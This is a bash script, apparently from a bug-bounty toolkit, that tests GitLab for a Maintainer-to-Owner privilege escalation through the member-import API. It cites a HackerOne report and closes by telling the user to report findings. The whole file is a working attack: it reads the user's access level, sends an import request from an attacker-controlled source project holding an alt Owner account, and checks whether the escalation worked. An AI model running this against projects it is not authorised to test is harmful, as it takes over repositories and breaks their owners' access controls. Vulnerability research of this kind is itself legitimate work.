#!/bin/bash
# GitLab Member Import Privilege Escalation
# Reference: theluci (HackerOne) — Maintainer→Owner via project import
#
# USAGE:
#   ./05-member-import-privesc.sh <gitlab-url> <token> <target-project-id> <source-project-id>

GITLAB_URL="${1:-https://gitlab.com}"
TOKEN="$2"
TARGET_ID="$3"
SOURCE_ID="$4"

if [ -z "$TOKEN" ] || [ -z "$TARGET_ID" ] || [ -z "$SOURCE_ID" ]; then
    echo "Usage: $0 <gitlab-url> <token> <target-project-id> <source-project-id>"
    echo ""
    echo "Pre-requisites:"
    echo "  1. You have Maintainer access on target project"
    echo "  2. You created a second project (source) where you're Owner"
    echo "  3. You invited your alt account as Owner of source project"
    echo "  4. Now import members from source -> target"
    echo ""
    echo "Example: $0 https://gitlab.com glpat-abc123 100 200"
    exit 1
fi

echo "[*] GitLab Member Import Privesc Test"
echo "[*] Target Project: $TARGET_ID"
echo "[*] Source Project: $SOURCE_ID (should have Owner-level member)"
echo ""

# Step 1: Check current permissions
echo "--- Step 1: Check current user permissions on target ---"
curl -s "$GITLAB_URL/api/v4/projects/$TARGET_ID/members/$(curl -s $GITLAB_URL/api/v4/user -H \"PRIVATE-TOKEN: $TOKEN\" | jq -r '.id')" \
  -H "PRIVATE-TOKEN: $TOKEN" | jq '{access_level, username}'

# Step 2: Attempt member import
echo ""
echo "--- Step 2: Attempt member import from source project ---"
echo "[*] If access_level is not validated during import,"
echo "[*] members from source (including Owner-level) get imported"
echo ""

RESULT=$(curl -s -X POST "$GITLAB_URL/api/v4/projects/$TARGET_ID/import" \
  -H "PRIVATE-TOKEN: $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"source_project_id\":$SOURCE_ID}")

echo "$RESULT" | jq .

# Step 3: Check if escalation worked
echo ""
echo "--- Step 3: Verify if escalation succeeded ---"
echo "[*] Check if you now have higher permissions on target..."
curl -s "$GITLAB_URL/api/v4/projects/$TARGET_ID/members/$(curl -s $GITLAB_URL/api/v4/user -H \"PRIVATE-TOKEN: $TOKEN\" | jq -r '.id')" \
  -H "PRIVATE-TOKEN: $TOKEN" | jq '{access_level, username}'

echo ""
echo "[*] If access_level increased -> VULNERABLE!"
echo "[*] Report with reproduction steps from your own instance."
